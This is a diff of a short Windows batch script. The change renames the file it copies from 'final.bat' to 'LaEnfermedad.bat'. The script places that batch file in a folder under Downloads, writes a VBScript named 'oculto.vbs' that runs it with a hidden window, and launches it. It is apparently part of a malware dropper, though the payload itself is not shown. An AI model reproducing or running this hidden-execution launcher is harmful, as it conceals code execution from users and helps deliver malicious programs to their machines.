@@ -1,7 +1,7 @@
 md %userprofile%\Downloads\carpeta
-copy final.bat %userprofile%\Downloads\carpeta
+copy LaEnfermedad.bat %userprofile%\Downloads\carpeta
 IF EXIST %userprofile%\Downloads\carpeta\oculto.vbs goto in
-echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\final.bat", 0, True >%userprofile%\Downloads\carpeta\oculto.vbs
+echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\LaEnfermedad.bat", 0, True >%userprofile%\Downloads\carpeta\oculto.vbs
 start %userprofile%\Downloads\carpeta\oculto.vbs
 exit
 :in
